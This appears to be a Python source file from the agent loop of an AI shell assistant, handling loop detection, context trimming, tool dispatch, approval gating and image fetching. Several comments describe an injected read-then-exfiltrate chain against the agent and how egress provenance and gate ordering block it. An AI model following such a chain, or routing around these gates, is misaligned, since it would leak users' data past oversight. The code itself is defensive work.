                key = self._call_key(call, result)
                repeats[key] = count = repeats.get(key, 0) + 1
                if count == 1:
                    progressed = True  # a never-seen (tool,args,result) is progress (#108)
                if count >= LOOP_STOP_REPEATS:
                    stuck = True
                elif count == LOOP_WARN_REPEATS:
                    warn = True  # injected below: never between a turn's results
            if stuck:
                self.echo("✕ loop detected: identical call, identical output — stopping")
                return self._finish_stopped(LOOP_STOP_NOTE, STOPPED_LOOP)
            # Progress resets the stall clock; a step that produced only repeats
            # (or, defensively, no results at all) advances toward the stall cap.
            stall = 0 if progressed else stall + 1
            if stall >= MAX_STALL_STEPS:
                self.echo("⚠ no new progress for several steps — asking the model to wrap up")
                return self._finish_stopped(STALL_NOTE, STOPPED_STALL)
            if warn:
                self.echo("⚠ repeated identical tool call — nudging the model to change approach")
                self._append(
                    {"role": "user", "content": LOOP_WARNING.format(count=LOOP_WARN_REPEATS)}
                )

        self.echo("⚠ step ceiling reached — asking the model to wrap up")
        return self._finish_stopped(STEP_LIMIT_NOTE, STOPPED_LIMIT)

    @staticmethod
    def _call_key(call: dict, result: str) -> tuple:
        """Identity of a tool call AND its outcome — repr(args) because
        argument values may be unhashable."""
        function = call["function"]
        arguments = repr(sorted((function.get("arguments") or {}).items()))
        return (function["name"], arguments, result)

    def _finish_stopped(self, note: str, headline: str) -> str:
        """Step budget exhausted or loop detected: one final no-tools turn so
        the model can judge completion and report state (what's done, what
        remains, why it's stuck) instead of the task cutting off with a bare
        error line. The step budget is never silently exceeded — continuing
        is the user's call."""
        self._append({"role": "user", "content": note})
        self.status.start("wrapping up")
        try:
            content, tool_calls, _usage, raw_blocks, _thinking = self._chat_turn()
        except TaskCancelled:
            return self._finish_cancelled()
        except ModelUnavailable:
            content, tool_calls, raw_blocks = "", [], None
        finally:
            self.status.stop()
        if content or tool_calls:
            entry: dict = {"role": "assistant", "content": content}
            if tool_calls:
                entry["tool_calls"] = tool_calls
            if raw_blocks:
                entry["raw_blocks"] = raw_blocks
            self._append(entry)
            for call in tool_calls:  # every tool_use still needs a paired result
                self._append(
                    {
                        "role": "tool",
                        "tool_name": call["function"]["name"],
                        "content": NOT_EXECUTED_LIMIT,
                    }
                )
        if not content and self.on_token:
            self.on_token(headline + "\n")
        return f"{headline}\n\n{content}" if content else headline

    def _finish_cancelled(self) -> str:
        """History stays model-consumable: an assistant note closes the turn."""
        self._append({"role": "assistant", "content": CANCELLED_RESULT})
        if self.on_token:
            self.on_token(CANCELLED_RESULT + "\n")
        self.echo("✕ task stopped")
        return CANCELLED_RESULT

    def _chat_turn(self) -> tuple[str, list[dict], tuple[int, int], list | None, str]:
        """One model call; returns (content, normalized tool_calls, token usage,
        provider-native raw blocks or None, thinking text or ""). Streams
        content through on_token when set. Retries once on a transport error (a
        busy/overloaded local Ollama commonly drops or refuses a request)."""
        self._refresh_plugin_tools()
        kwargs = dict(
            model=self.model,
            messages=self.messages,
            tools=tools.TOOL_SCHEMAS + self._plugin_defs,
            options={"num_ctx": self.num_ctx},
            think=self.think,
        )
        last_error: Exception | None = None
        for attempt in range(2):
            try:
                return self._one_chat(kwargs)
            except TaskCancelled:
                raise  # a user stop is not a transport error — never retry
            except Exception as exc:  # noqa: BLE001 — surface, don't crash the REPL
                last_error = exc
                if attempt == 0:
                    self.echo(f"model call failed ({exc}); retrying once…")
        raise ModelUnavailable(str(last_error)) from last_error

    def _one_chat(
        self, kwargs: dict
    ) -> tuple[str, list[dict], tuple[int, int], list | None, str]:
        raw_blocks = None
        thinking = ""
        if self.on_token is None:
            response = self.chat(**kwargs)
            message = response.message
            content = message.content or ""
            raw_calls = message.tool_calls or []
            usage = _usage(response)
            raw_blocks = getattr(message, "raw_blocks", None)
            thinking = getattr(message, "thinking", None) or ""
        else:
            parts: list[str] = []
            thinking_parts: list[str] = []
            thinking_head = ""
            raw_calls = []
            usage = (0, 0)
            for chunk in self.chat(stream=True, **kwargs):
                if self._cancel.is_set():
                    # Abandoning the iterator closes the connection, which
                    # stops generation server-side — the fastest stop there is.
                    raise TaskCancelled
                # Ollama streams ~one chunk per generated token, so chunk
                # count drives the live "↓ N tokens" readout on the ticker.
                self.status.add_tokens(1)
                message = chunk.message
                if tchunk := getattr(message, "thinking", "") or "":
                    thinking_parts.append(tchunk)
                    # Live "Thinking: <gist>" on the web header: forward the
                    # opening of the reasoning while it streams. Only the head
                    # matters (the snippet is one line), so stop appending —
                    # and stop emitting — once it's long enough.
                    if len(thinking_head) < STATUS_SNIPPET_CHARS * 2:
                        thinking_head += tchunk
                        if snippet := _status_snippet(thinking_head):
                            self.status.note(snippet)
                if message.content:
                    if not parts:
                        self.status.stop()  # erase the live timer line first
                        self.on_token("\n")
                    parts.append(message.content)
                    self.on_token(message.content)
                if message.tool_calls:
                    raw_calls.extend(message.tool_calls)
                if getattr(message, "raw_blocks", None):
                    raw_blocks = message.raw_blocks
                if _usage(chunk) != (0, 0):  # counts arrive on the final chunk
                    usage = _usage(chunk)
            content = "".join(parts)
            thinking = "".join(thinking_parts)
            if content:
                self.on_token("\n")
        return content, [self._normalize_call(c) for c in raw_calls], usage, raw_blocks, thinking

    @staticmethod
    def _normalize_call(call: Any) -> dict:
        """Plain-dict tool call: safe to keep in history and send back to the
        backend. extra_content (e.g. Gemini thought signatures) must survive
        the round trip — some providers reject the next request without it."""
        if isinstance(call, dict):
            function = call.get("function") or {}
            name = function.get("name", "")
            arguments = function.get("arguments") or {}
            extra = call.get("extra_content")
        else:
            name = call.function.name
            arguments = call.function.arguments or {}
            extra = getattr(call, "extra_content", None)
        normalized = {"function": {"name": name, "arguments": dict(arguments)}}
        if extra:
            normalized["extra_content"] = extra
        return normalized

    def _trim_tool_message(self, message: dict) -> bool:
        if message.get("role") != "tool":
            return False
        content = message["content"]
        if len(content) <= TRIM_KEEP_CHARS + len(TRIMMED_NOTE):
            return False
        message["content"] = content[:TRIM_KEEP_CHARS] + TRIMMED_NOTE
        return True

    def _trim_eagerly(self, task_start: int) -> None:
        """The eager per-task trim: every prior tool output down to a 200-char
        stub, unconditionally — NOT budget-gated (only the resume path is), so
        a 27 KB result is destroyed at turn 2 regardless of available room.

        This is the truncator with the largest blast radius and, until #192,
        the one that recorded NOTHING at all — which is why Session B, asked
        why its output was truncated, grepped aish's source, found a different
        truncator's marker and confidently blamed the wrong thing."""
        before = self._total_chars()
        affected = sum(
            1 for message in self.messages[1:task_start] if self._trim_tool_message(message)
        )
        self._record_trim("eager_stub", affected, before, budget=None)

    def _trim_history_to_budget(self) -> None:
        """Shrink restored tool outputs oldest-first, but only as far as the
        character budget actually demands (#164). The counterpart to the eager
        per-task trim: on a resume the newest results are the ones the model
        needs verbatim to continue, so they are the last to go."""
        budget = self.num_ctx * CHARS_PER_TOKEN_BUDGET
        before = self._total_chars()
        affected = 0
        for message in self.messages[1:]:
            if self._total_chars() <= budget:
                break
            affected += bool(self._trim_tool_message(message))
        self._record_trim("budget_oldest_first", affected, before, budget=budget)

    def _record_trim(self, policy: str, affected: int, before: int, budget: int | None) -> None:
        """The `trim` record (contract §3.5). Renderless — it edits history
        rather than describing a call, so it cannot ride the `tool` step.
        `budget: null` states the fact #192 says is wrong and which no record
        stated before: the trim was unconditional."""
        if not affected:
            return
        _, cap_source = backends.context_window(self.provider, self.num_ctx)
        self._emit_record(
            kind="trim",
            policy=policy,
            affected=affected,
            bytes_before=before,
            bytes_after=self._total_chars(),
            keep_chars=TRIM_KEEP_CHARS,
            budget=budget,
            cap_source=("constant:TRIM_KEEP_CHARS" if budget is None else cap_source),
            oldest_first=policy == "budget_oldest_first",
        )

    def _total_chars(self) -> int:
        return sum(len(message.get("content") or "") for message in self.messages)

    def _enforce_budget(self, task_start: int) -> None:
        """Trim this task's oldest tool outputs (never the 2 most recent)
        until the conversation fits the character budget."""
        budget = self.num_ctx * CHARS_PER_TOKEN_BUDGET
        if self._total_chars() <= budget:
            return
        tool_indices = [
            i
            for i in range(task_start, len(self.messages))
            if self.messages[i].get("role") == "tool"
        ]
        for i in tool_indices[:-2]:
            if self._trim_tool_message(self.messages[i]) and self._total_chars() <= budget:
                return

    def expand_alias(self, command: str) -> str:
        """Rewrite the first word via the aish alias map, BEFORE approval sees
        it. The single chokepoint both entry points (_dispatch for model-issued
        commands, run_user_command for ! commands) route through, so the gate,
        denylist, and cd-check always classify the REAL command — never an
        opaque alias name."""
        return alias_map.expand(command, self.aliases)

    def run_user_command(self, command: str) -> str:
        """A command the user typed directly (! prefix): no approval needed,
        but recorded in the conversation so the model has the context.
        !cd is an alias for /cd — the user moving the directory always means
        moving the project, so cwd and the primary root travel together and
        the model's anchor stays coherent."""
        command = self.expand_alias(command)
        cd_target = self._parse_cd(command)
        if cd_target is not None:
            return self.rebase(cd_target)
        self._cancel.clear()  # a stale stop must not kill the new command
        # Framing brackets the output as a terminal block for rich clients (the
        # web UI) and records it for cold replay, exactly like a model command;
        # on the CLI on_command_start/end are unset, so it stays log-only.
        self._emit_command_start(command, user=True)
        # should_stop wires the web UI Stop button to this user command: cancel()
        # sets the same event the model path polls, so a long/hung ! command is
        # interruptible (its whole process group is signaled — issue #76).
        result = tools.run_command(
            command,
            cwd=self.cwd,
            on_line=self.stream,
            allow_detach=True,
            log_dir=self.job_log_dir,
            should_stop=self._cancel.is_set,
        )
        if self._cancel.is_set():
            self._emit_command_end(status="interrupted")
        else:
            self._emit_command_end(status="exit", exit_code=_parse_exit_code(result))
        if self.stream is None:
            self.echo(result)
        self._append(
            {"role": "user", "content": f"[I ran `{command}` myself; output:]\n{result}"}
        )
        return result

    def add_user_context(self, text: str) -> None:
        """Append a user-authored context turn WITHOUT running the model: the note
        becomes visible to the model on its next task and is logged so it survives
        `--resume`, but no answer is generated now. Backs the web "share selection
        to context" action for the global interactive console (issue #148), where
        the terminal I/O is otherwise private to the terminal. The caller's
        `[…]` framing keeps the logged turn out of the replayed transcript, which
        is where the live UI leaves it too (session.synthetic_kind, #171)."""
        self.note_owner_hosts(text)  # user-shared context is owner-authored
        self._append({"role": "user", "content": text})

    def rebase(self, target: str, announce: bool = True) -> str:
        """User-typed /cd (and its alias !cd): move cwd AND re-anchor the
        primary session root. Never reachable by the model — that's what
        keeps root scoping honest.

        `announce` appends a user-turn note telling the model the project moved.
        It's suppressed mid-task (announce=False from _apply_pending_cwd): a fresh
        user turn injected mid-flight reads as a new prompt, so the model
        abandons the running task to answer it. Between tasks (immediate /cd,
        post-task apply, CLI) it's fine — it's the model's cwd signal there."""
        result = self._change_dir(target)
        if result.startswith("ERROR"):
            return result
        self.roots[0] = Path(self.cwd).resolve()
        self._sync_cwd_in_context()  # system prompt reflects the new cwd (no user turn)
        self._emit_workspace("cwd", self.cwd)  # the timeline marker; no grey echo
        if announce:
            self._append(
                {"role": "user", "content": f"[I moved the session to {self.cwd} with /cd — "
                 "this directory is the project now]"}
            )
        return result

    def add_root(self, target: str) -> str:
        """User-typed /add-dir: allow auto-approved reads/commands in another tree."""
        path = Path(os.path.expanduser(target))
        if not path.is_absolute():
            path = Path(self.cwd) / path
        path = path.resolve()
        if not path.is_dir():
            return f"ERROR: no such directory: {path}"
        if path in self.roots:
            return f"[{path} is already a session root]"
        self.roots.append(path)
        self._emit_workspace("trust", str(path))
        note = f"[I added {path} as a session root with /add-dir — you may work there too]"
        self._append({"role": "user", "content": note})
        return f"[added session root {path}]"

    def trust_root(self, target: str) -> str:
        """Approver-side 'trust this directory for this session': widens the
        roots mid-approval. Unlike add_root it never touches the conversation —
        it runs while a tool call is in flight, where an injected user message
        could break providers that require tool results to follow tool calls."""
        path = Path(os.path.expanduser(target))
        if not path.is_absolute():
            path = Path(self.cwd) / path
        path = path.resolve()
        if not path.is_dir():
            return f"ERROR: no such directory: {path}"
        if any(path.is_relative_to(root) for root in self.roots):
            return f"[{path} is already inside a session root]"
        self.roots.append(path)
        self._emit_workspace("trust", str(path))
        return f"[trusted for this session: {path}]"

    def image_roots(self) -> list[Path]:
        """Directories a picture in an answer may be DISPLAYED from (#188).

        The session roots plus the two directories aish itself owns: the media
        store (where show_image puts everything) and the scratch workspace
        (which the model may already write to unprompted, so serving from it
        grants nothing new). ONE definition, consumed by every renderer — the
        web /file endpoint, the PDF exporter, and the terminal's inline images.
        They disagreed before: the exporter trusted the scratch dir and /file
        did not, so the same file printed in a PDF and 403'd in the chat.

        Distinct from `roots` on purpose: `roots` is the AUTO-APPROVAL scope and
        is rebuilt authoritatively per session (restore_workspace), which the
        process-owned directories here must not be dragged into.
        """
        return [*self.roots, self.media_dir, self.scratch_dir]

    def _execute_tool_calls(self, tool_calls: list[dict]) -> list[str]:
        """Run one model turn's tool calls; results keep the call order.

        Read-only tools (no side effects, no approval prompt) run concurrently
        when the turn has more than one — they are network/disk-bound, so this
        is a pure latency win. Anything that prompts the user or writes stays
        sequential: two interleaved [y/N] prompts would be unanswerable.
        """
        calls = [(c["function"]["name"], c["function"]["arguments"] or {}) for c in tool_calls]
        concurrent = [
            i
            for i, (name, args) in enumerate(calls)
            if (name in READ_ONLY_TOOLS or self._is_readonly_plugin(name))
            and not self._read_needs_prompt(name, args)
        ]
        # While ANY gate is armed, everything goes through _dispatch
        # sequentially — the parallel thunks below would bypass the gate (and
        # neither the skill-counter dict nor a binding's refusal rounds are
        # thread-safe). `_bindings` belongs in this condition for exactly the
        # reason the other two do: a rule that only holds for serial turns is
        # not a rule, and web_search/read_url — the tools the canonical rule
        # prohibits — are the readonly set this branch fans out.
        if (
            len(concurrent) < 2
            or self._pending_skill_reads
            or self._pending_comment_response
            or self._bindings
        ):
            return [
                self._call_result(
                    name, partial(self._timed, partial(self._dispatch, name, args)), args=args
                )
                for name, args in calls
            ]

        results: list[str] = [""] * len(calls)
        with ThreadPoolExecutor(max_workers=min(len(concurrent), 8)) as pool:
            batch_start = time.perf_counter()
            futures = {}
            for i in concurrent:
                label, thunk = self._read_only_call(*calls[i])
                self._note(label)
                # _timed runs on the worker so the reported duration is the
                # call's true runtime, not how long collection waited for it.
                futures[i] = pool.submit(self._timed, thunk)
            # Collect futures first, under one live timer; future.result()
            # re-raises worker exceptions here, so error echoes stay on the
            # main thread. Tools that may prompt the user run after the timer
            # stops — a [y/N] prompt must never fight the ticking line.
            self.status.start(f"{len(futures)} parallel lookups")
            try:
                for i in futures:
                    # ⇉ marks overlapped runtimes: they exceed wall time when
                    # summed, so only the batch ✓ line below counts toward ∑.
                    results[i] = self._call_result(
                        calls[i][0], futures[i].result, mark="⇉", args=calls[i][1]
                    )
            finally:
                self.status.stop()
            self._note(
                f"✓ {len(futures)} parallel lookups "
                f"{format_secs(time.perf_counter() - batch_start)}"
            )
            for i, (name, args) in enumerate(calls):
                if i not in futures:
                    results[i] = self._call_result(
                        name, partial(self._timed, partial(self._dispatch, name, args)), args=args
                    )
        return results

    @staticmethod
    def _timed(fn: Callable[[], str]) -> tuple[str, float]:
        start = time.perf_counter()
        return fn(), time.perf_counter() - start

    @staticmethod
    def _arg_summary(name: str, args: dict) -> str:
        """A one-line human label for a tool call — the trace step subtitle."""
        a = args or {}
        if name == "read_skill":
            return str(a.get("name", ""))
        if name == "web_search":
            return str(a.get("query", ""))
        if name == "read_url":
            return str(a.get("url", ""))
        if name == "show_image":
            return str(a.get("source", ""))
        if name == "recall":
            return str(a.get("query") or a.get("name") or "")
        if name in ("read_file", "write_file", "edit_file"):
            return str(a.get("path", ""))
        if name in ("remember", "forget_memory"):
            return str(a.get("name") or "memory")
        # read_docs, run_command, and anything else: the command/topic string.
        return str(a.get("command", ""))

    def _call_result(
        self,
        name: str,
        fn: Callable[[], tuple[str, float]],
        mark: str = "✓",
        args: dict | None = None,
    ) -> str:
        args = args or {}
        self._run_meta = None
        # Assigned per call and carried as a LOCAL, never read back off the
        # agent: read-only tools run in parallel, so an instance attribute
        # would hand two concurrent calls the same id — which is exactly the
        # by-name ambiguity §2 exists to remove.
        call_no = next(self._call_seq)
        # Also published thread-locally so a gate verdict emitted deep inside
        # _dispatch joins to THIS call's `tool` step (§2). The local above stays
        # the source of truth for the step itself.
        self._call_ids.current = call_no
        self._emit_step(
            kind="tool_start",
            name=name,
            call=call_no,
            summary=self._arg_summary(name, args),
            command=str(args.get("command", "")) if name == "run_command" else "",
        )
        try:
            result, elapsed = fn()
        except ModuleNotFoundError as exc:
            # A broken install, not a transient failure: retrying the
            # same call can never succeed, so say so to the model too.
            result = (
                f"ERROR: tool '{name}' is unavailable — this aish "
                f"installation is missing the '{exc.name}' package. "
                "Do NOT retry this tool; it will keep failing. Tell "
                "the user to reinstall aish (uv tool install --force "
                "git+https://github.com/epnasis/aish.git) and restart."
            )
            self.echo(result)
            self._emit_step(
                kind="tool",
                name=name,
                call=call_no,
                secs=0.0,
                ok=False,
                status=tools.STATUS_FAILED,
                verdict_by=tools.VERDICT_EXCEPTION,
                summary="unavailable",
            )
            return result
        except Exception as exc:  # noqa: BLE001 — a tool bug must not kill the session
            result = f"ERROR: tool '{name}' failed internally: {exc!r}"
            self.echo(result)
            self._emit_step(
                kind="tool",
                name=name,
                call=call_no,
                secs=0.0,
                ok=False,
                status=tools.STATUS_FAILED,
                verdict_by=tools.VERDICT_EXCEPTION,
                summary="failed",
            )
            return result
        self._note(f"{mark} {name} {format_secs(elapsed)}")
        self._emit_tool_step(name, args, result, elapsed, call_no)
        # The single funnel every tool call passes through, parallel path
        # included — so a binding's view of "was the routed tool tried, and did
        # it work?" cannot miss a call that took another branch (#191).
        self._observe_for_rules(name, result)
        return result

    def _emit_tool_step(
        self, name: str, args: dict, result: str, secs: float, call_no: int = 0
    ) -> None:
        if self.on_step is None and self.step_log is None:
            return
        # The envelope (#192) — the runtime's own verdict, travelling WITH the
        # result rather than sniffed off its first token. `ok` is kept, defined
        # as status == "ok", so the frontend needs no change and old logs read
        # the same (contract §3.4).
        envelope = getattr(result, "meta", None) or {}
        status = envelope.get("status")
        if status is None:
            # No envelope: the legacy prefix sniff is still the floor for native
            # tools. Recorded EXPLICITLY as verdict_by:"prefix" rather than left
            # absent — absence must never be the evidence (contract corollary 2)
            # — and counting these is the honest measure of conversion debt.
            sniffed_ok = not (
                result.startswith("ERROR") or result.startswith("NOT EXECUTED")
            )
            status = tools.STATUS_OK if sniffed_ok else tools.STATUS_FAILED
            envelope = {"status": status, "verdict_by": tools.VERDICT_PREFIX}
        ok = status == tools.STATUS_OK
        step: dict[str, Any] = {
            "kind": "tool",
            "name": name,
            "secs": secs,
            "ok": ok,
            "summary": self._arg_summary(name, args),
            "call": call_no,
            **envelope,
        }
        if not ok and self._run_meta is None:
            # Non-run_command failure (a read_url/web_search error, a gate
            # refusal): carry the message so the trace can explain what broke.
            step["error"] = result[:STEP_OUTPUT_CAP]
        if self._run_meta is not None:  # run_command: command, decision, output
            step.update(self._run_meta)
            self._run_meta = None
            output = step.get("output") or ""
            if len(output) > STEP_OUTPUT_CAP:  # the trace shows a preview, not the full log
                step["output"] = output[:STEP_OUTPUT_CAP] + "\n… (truncated)"
        # ONE rule, applied last, over every path that can refuse: if the
        # action did not happen, the step is not green. This is wider than the
        # five plugin constants the contract enumerates (§6.13) — `run_command`
        # sets `decision` in _run_meta but no `ok`, and DENIED_RESULT ("USER
        # DENIED…"), HELD_FOR_ADJUSTMENT ("NOT RUN…") and BLOCKED_RESULT
        # ("BLOCKED…") start with none of the sniffed prefixes either, so a
        # denied shell command logged ok:true as well. Deriving both fields
        # from the decision also keeps them COHERENT: `ok` is defined as
        # status == "ok", and two sources used to be able to disagree.
        if step.get("decision") in REFUSED_DECISIONS:
            step["ok"] = False
            step["status"] = tools.STATUS_FAILED
            step["verdict_by"] = tools.VERDICT_GATE
        self._sink_step(step)

    def _read_only_call(self, name: str, args: dict) -> tuple[str, Callable[[], str]]:
        """(echo label, execution thunk) for a READ_ONLY_TOOLS member — split
        so the label prints before the thunk possibly runs on a worker thread."""
        if name == "read_docs":
            command = str(args.get("command", ""))
            topic = args.get("topic") or None
            label = f"→ read_docs: {command}" + (f" (topic: {topic})" if topic else "")
            return label, partial(tools.read_docs, command, topic=str(topic) if topic else None)
        if name == "read_skill":
            skill = str(args.get("name", ""))
            return f"→ read_skill: {skill}", partial(
                skills.load_skill, skill, skills.skill_dirs(self.cwd)
            )
        if name == "web_search":
            query = str(args.get("query", ""))
            return f"→ web_search: {query}", partial(web.web_search, query)
        if name == "read_url":
            url = str(args.get("url", ""))
            topic = args.get("topic") or None
            label = f"→ read_url: {url}" + (f" (topic: {topic})" if topic else "")
            return label, partial(web.read_url, url, topic=str(topic) if topic else None)
        if name == "show_image":
            source = str(args.get("source", ""))
            caption = str(args.get("caption", "") or "")
            return f"→ show_image: {source}", partial(self._show_image, source, caption)
        if name == "recall":
            query = str(args.get("query", "") or "")
            entry = str(args.get("name", "") or "").strip() or None
            label = f"→ recall: {query or '(no query)'}" + (
                f" (name: {entry})" if entry else ""
            )
            return label, partial(self._recall, query, entry)
        if name == "read_tool_output":
            key = str(args.get("continuation", "") or "")
            page = args.get("page", 2)
            return f"→ read_tool_output: {key} page {page}", partial(
                self._read_tool_output, args
            )
        tool = self._plugin_tools.get(name)
        if tool is not None:  # read-only plugin tool (mutating ones never reach here)
            shown = ", ".join(f"{k}={v!r}" for k, v in args.items())
            return f"→ {name}({shown})", partial(self._run_readonly_plugin, tool, args)
        return self._read_file_call(args)  # read_file

    def _is_readonly_plugin(self, name: str) -> bool:
        tool = self._plugin_tools.get(name)
        return tool is not None and not tool.mutating

    def _run_readonly_plugin(self, tool: "tool_plugins.Tool", args: dict) -> str:
        problem = tool_plugins.validate_args(tool, args)
        if problem is not None:
            return tools.ToolOutcome(
                problem,
                status=tools.STATUS_FAILED,
                verdict_by=tools.VERDICT_EXCEPTION,
                error="invalid_args",
            )
        return self._execute_plugin(tool, args)

    def _execute_plugin(self, tool: "tool_plugins.Tool", args: dict) -> str:
        """The single plugin execution point, so truncation is sized from the
        real backend and cached for paging on BOTH the parallel read-only path
        and the gated mutating one — a cap that applies on one path only is the
        kind of divergence #192 exists to remove."""
        caps, cap_source = self._output_caps()
        return tool_plugins.execute(
            tool,
            args,
            cwd=self.cwd,
            caps=caps,
            cap_source=cap_source,
            store_dir=self.tool_output_dir,
        )

    def _output_caps(self) -> tuple[tuple[int, int], str]:
        """(head, tail) and the provenance of that size. `num_ctx` is an
        OLLAMA-ONLY option every cloud backend accepts and discards, so sizing
        a cap from it on Gemini-1M produced a number describing no real
        constraint (#192)."""
        window, source = backends.context_window(self.provider, self.num_ctx)
        return tool_plugins.output_caps(window), source

    def _read_tool_output(self, args: dict) -> str:
        """Page a cached tool output (#192). Served from the content-addressed
        store, so THE WRAPPER NEVER RE-RUNS — for a nondeterministic or
        mutating tool a re-run is a different result or a second side effect,
        not merely slower."""
        key = str(args.get("continuation", "") or "").strip()
        try:
            page = int(args.get("page", 2) or 2)
        except (TypeError, ValueError):
            page = 2
        (head, tail), _ = self._output_caps()
        text = tool_plugins.read_continuation(key, self.tool_output_dir, page, head, tail)
        if text is None:
            return tools.ToolOutcome(
                f"ERROR: no cached output for continuation={key!r}. It may have "
                "been evicted from the cache. Re-run the tool that produced it "
                "if you still need the rest — and do NOT substitute another "
                "source without saying so.",
                status=tools.STATUS_FAILED,
                verdict_by=tools.VERDICT_EXCEPTION,
                error="unknown_continuation",
            )
        if text == "":
            return tools.ToolOutcome(
                f"[aish: page {page} is past the end of this output — you have "
                "read all of it.]",
                status=tools.STATUS_OK,
                verdict_by=tools.VERDICT_EXIT_CODE,
                page=page,
                source="cache",
            )
        more = (
            f"\n\n[aish: continue with read_tool_output(continuation=\"{key}\", "
            f"page={page + 1}) if you have not reached the end.]"
        )
        return tools.ToolOutcome(
            text + more,
            status=tools.STATUS_OK,
            verdict_by=tools.VERDICT_EXIT_CODE,
            page=page,
            source="cache",
            bytes=len(text),
        )

    def _recall(self, query: str, name: str | None) -> str:
        # Embedding similarity reaches the deliberate-search path too (#178
        # P1-9), not only preflight — same fallback discipline: scores()
        # failing → None → recall_text is byte-identical to pure lexical.
        semantic = self.semantic.scores if self.semantic is not None else None
        if self.origin != "user":
            # A triggered session must not search the whole past-session
            # archive (#178 P0-2): recall over every conversation ever held is
            # a far larger read capability than this unattended task needs,
            # and it is the read half of the injected read→exfiltrate chain.
            # Knowledge entries (skills/memories) stay available.
            return (
                skills.recall_text(
                    self.cwd, self.lessons_path, query, name=name, semantic=semantic
                )
                + "\n\n(Past-session archive search is unavailable in automated "
                "sessions — only saved skills and memory were searched. Do not "
                "retry with session names.)"
            )
        if self.state_dir is None:
            return skills.recall_text(
                self.cwd, self.lessons_path, query, name=name, semantic=semantic
            )
        state_dir = Path(self.state_dir)
        exclude: set = set()
        if self.current_session is not None:
            exclude.add(Path(self.current_session()))
        return skills.recall_text(
            self.cwd,
            self.lessons_path,
            query,
            name=name,
            sessions_search=lambda q: SessionLog.recall_sessions(state_dir, q, exclude=exclude),
            session_detail=lambda session, q: SessionLog.search_excerpts(
                state_dir, q, session=session
            ),
            semantic=semantic,
        )

    def _show_image(self, source: str, caption: str) -> str:
        """Fetch or adopt an image, store it, and hand back the markdown line.

        Every failure returns a sentence naming what went wrong, so the model
        learns DURING the turn and can try another source. That is the whole
        point: before this, every way an image could fail failed in the browser
        after the turn was over, and the only channel back was the user saying
        "images don't show" (#188).
        """
        source = source.strip()
        if not source:
            return "ERROR: show_image needs a source (an image URL or a local path)."
        if source.lower().startswith(("http://", "https://")):
            data, problem = self._fetch_image_bytes(source)
        else:
            data, problem = self._read_local_image(source)
        if problem is not None:
            # The no-curl reminder rides the FAILURE, not just the system
            # prompt: observed behaviour is that a failed show_image is exactly
            # when the model reaches for `curl -o`, which produces a file no
            # renderer serves and costs the user an approval prompt for nothing.
            return f"ERROR: {problem} {SHOW_IMAGE_NO_CURL}"
        try:
            path = media.store(data, self.media_dir, caption or source.rsplit("/", 1)[-1])
        except ValueError:
            # Reached only for a local file that sniffed fine and changed under
            # us; the fetch paths already classify non-image bytes themselves.
            return "ERROR: those bytes are not a displayable image (png/jpg/gif/webp only)."
        except OSError as exc:
            return f"ERROR: could not store the image ({exc})."
        # We build the line rather than trusting the model to: a caption with a
        # bracket or a newline in it silently breaks the markdown image parser,
        # which used to be worked around by a memory (#188 layer 3).
        alt = re.sub(r"\s+", " ", caption).replace("[", "").replace("]", "").strip()
        return (
            "Image ready. Include this line in your answer EXACTLY as written "
            f"(do not alter the path):\n\n![{alt or 'image'}]({path})"
        )

    def _fetch_image_bytes(self, url: str) -> tuple[bytes, str | None]:
        """(bytes, None) or (b"", problem). Server-side so the browser never
        fetches a model-chosen URL — see media.py's module docstring."""
        try:
            data, content_type = web.fetch_binary(url, media.IMAGE_MAX_BYTES)
        except web.BlockedURLError as exc:
            return b"", f"blocked: {exc}. Use a normal public image URL."
        except urllib.error.HTTPError as exc:
            return b"", (
                f"the server answered HTTP {exc.code} for that URL. "
                "Find a different image, or read_url the page again for a working one."
            )
        except Exception as exc:  # transport, DNS, timeout, TLS — all recoverable
            return b"", f"could not fetch that URL ({type(exc).__name__}: {exc})."
        if len(data) > media.IMAGE_MAX_BYTES:
            return b"", (
                f"that image is larger than {media.IMAGE_MAX_BYTES // (1024 * 1024)} MB. "
                "Look for a smaller version."
            )
        if media.sniff(data) is None:
            # The failure this catches: a page, a hotlink block, or a WAF
            # challenge served under an image URL. The extension agrees; the
            # bytes do not.
            return b"", (
                f"that URL is not an image — the server returned {content_type}, not "
                "picture data. It is probably the page the image sits on, or a "
                "hotlink block. Get the direct image file URL and try again."
            )
        return data, None

    def _read_local_image(self, source: str) -> tuple[bytes, str | None]:
        """A path already on this machine, confined to the directories images
        may be displayed from — storing one we could never serve would just move
        the silent failure to render time."""
        path = Path(os.path.expanduser(source))
        if not path.is_absolute():
            path = Path(self.cwd) / path
        try:
            path = path.resolve()
        except OSError as exc:
            return b"", f"could not resolve {source!r} ({exc})."
        roots = [Path(r).resolve() for r in self.image_roots()]
        if not any(path.is_relative_to(root) for root in roots):
            return b"", (
                f"{path} is outside this session's directories, so it could not be "
                "displayed even if stored. Ask the user to /add-dir its folder."
            )
        if not path.is_file():
            return b"", f"no such file: {path}"
        try:
            data = path.read_bytes()[: media.IMAGE_MAX_BYTES + 1]
        except OSError as exc:
            return b"", f"could not read {path} ({exc})."
        if len(data) > media.IMAGE_MAX_BYTES:
            return b"", f"{path} is larger than {media.IMAGE_MAX_BYTES // (1024 * 1024)} MB."
        if media.sniff(data) is None:
            return b"", f"{path} is not a png/jpg/gif/webp image."
        return data, None

    def add_system_note(self, text: str) -> None:
        """Append a note aish itself wrote as the next turn's context, WITHOUT
        treating it as owner-authored.

        Deliberately not add_user_context: that one calls note_owner_hosts,
        which would widen egress provenance with hosts taken from a string the
        MODEL chose (a failed image src) — the exact laundering the provenance
        model exists to prevent (#178 P0-2). The `[aish: …]` framing keeps it
        out of the replayed transcript (session.synthetic_kind, #171)."""
        self._append({"role": "user", "content": text})

    def _collect_source(self, call: dict, result: str) -> None:
        """Track pages actually fetched this task, so answers can cite them.
        Only read_url counts — web_search hits are found-but-maybe-unread."""
        if call["function"]["name"] != "read_url" or result.startswith("ERROR"):
            return
        url = str((call["function"].get("arguments") or {}).get("url", "")).strip()
        if not url or any(s["url"] == url for s in self.task_sources):
            return
        source = {"url": url}
        title = web.PAGE_TITLES.get(url)
        if title:
            source["title"] = title
        self.task_sources.append(source)

    def _read_needs_prompt(self, name: str, args: dict) -> bool:
        if name == "read_file":
            return self._read_prompt_reason(str(args.get("path", ""))) is not None
        # Egress calls needing an approval card (#178 P0-2) must run through
        # _dispatch sequentially — the parallel thunks would bypass the gate.
        return self._egress_novel_hosts(name, args) is not None

    def _egress_novel_hosts(self, name: str, args: dict) -> list[str] | None:
        """Hosts this call would reach that the owner never introduced, or
